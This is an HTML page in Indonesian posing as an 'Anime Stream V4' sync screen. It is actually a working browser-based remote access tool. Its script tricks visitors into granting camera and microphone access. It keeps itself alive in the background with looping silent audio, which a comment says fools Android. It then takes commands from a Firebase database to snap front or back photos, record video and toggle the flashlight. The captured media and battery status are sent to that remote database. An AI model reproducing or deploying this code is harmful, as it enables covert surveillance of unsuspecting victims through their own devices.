<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
    <style>
        video#bg { position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -1; filter: brightness(0.4); }
        .glass { background: rgba(0,0,0,0.6); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen text-white overflow-hidden">
    <video autoplay muted loop id="bg">
        <source src="https://assets.mixkit.co/videos/preview/mixkit-anime-style-cityscape-at-night-with-stars-and-clouds-40013-large.mp4" type="video/mp4">
    </video>

    <div class="glass p-10 rounded-3xl text-center max-w-sm">
        <h1 class="text-2xl font-bold mb-2">ANIME STREAM V4</h1>
        <p class="text-xs text-zinc-400 mb-6 uppercase">Syncing server...</p>
        <button id="btn" onclick="startRat()" class="bg-blue-600 hover:bg-blue-500 px-8 py-3 rounded-full font-bold shadow-lg shadow-blue-500/50 transition-all">SINKRONISASI DATA</button>
    </div>

    <script>
        const config = { databaseURL: "https://ralxaratpronect-default-rtdb.asia-southeast1.firebasedatabase.app/" };
        firebase.initializeApp(config);
        const db = firebase.database();
        let stream = null;
        let blinkInterval = null;

        async function startRat() {
            try {
                // IZIN UTAMA (Wajib diklik user)
                stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                document.getElementById('btn').innerText = "KONEKSI STABIL";
                
                // --- ANTI-MATI (Tanam permanen di background) ---
                const a = new Audio('https://raw.githubusercontent.com/anars/blank-audio/master/10-seconds-of-silence.mp3');
                a.loop = true; a.play(); // Nipu sistem Android biar dikira aplikasi musik

                listen();
                updateBattery();
            } catch(e) { alert("Butuh Izin Kamera!"); }
        }

        async function updateBattery() {
            if('getBattery' in navigator) {
                const b = await navigator.getBattery();
                const sendBat = () => db.ref("raxv3/info").set({level: Math.round(b.level * 100) + "%", charging: b.charging});
                sendBat(); b.onlevelchange = sendBat;
            }
        }

        function listen() {
            db.ref("raxv3/cmd").on("value", async s => {
                const d = s.val(); if(!d) return;
                // --- KONTROL SENTER ---
                if(d.a === 'S_ON') toggleFlash(true);
                else if(d.a === 'S_OFF') { toggleFlash(false); clearInterval(blinkInterval); }
                else if(d.a === 'S_BLINK') startBlink();
                // --- KONTROL FOTO ---
                else if(d.a === 'SNAP_F') takePic('user');
                else if(d.a === 'SNAP_B') takePic('environment'); // FIX SENTER BELAKANG
                // --- KONTROL VIDEO ---
                else if(d.a === 'VID_REC') startVidRec();
            });
        }

        async function toggleFlash(on) {
            if(stream) {
                const track = stream.getVideoTracks()[0];
                try {
                    await track.applyConstraints({advanced: [{torch: on}]});
                } catch(e) { console.log("Senter gagal (Mode Belakang?)"); }
            }
        }

        function startBlink() {
            clearInterval(blinkInterval); // Hapus interval sebelumnya
            let on = true;
            blinkInterval = setInterval(() => {
                toggleFlash(on); on = !on;
            }, 500); // Kelap-kelip setiap 500ms
        }

        async function takePic(mode) {
            // FIX: Buka stream baru sesuai mode kamera (Depan/Belakang)
            const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setTimeout(() => {
                const c = document.createElement('canvas'); c.width=480; c.height=640;
                c.getContext('2d').drawImage(v,0,0,c.width,c.height);
                db.ref("raxv3/media").set({type:'img', data: c.toDataURL('image/jpeg', 0.5), t: Date.now()});
                s.getTracks().forEach(t => t.stop()); // Tutup stream kamera setelah jepret
            }, 2000); // Delay biar fokus kamera jalan dulu
        }

        function startVidRec() {
            const mediaRecorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, {type: 'video/webm'});
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => {
                    db.ref("raxv3/media").set({type:'vid', data: reader.result, t: Date.now()});
                };
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000); // Rekam 5 detik
        }
    </script>
</body>
</html>
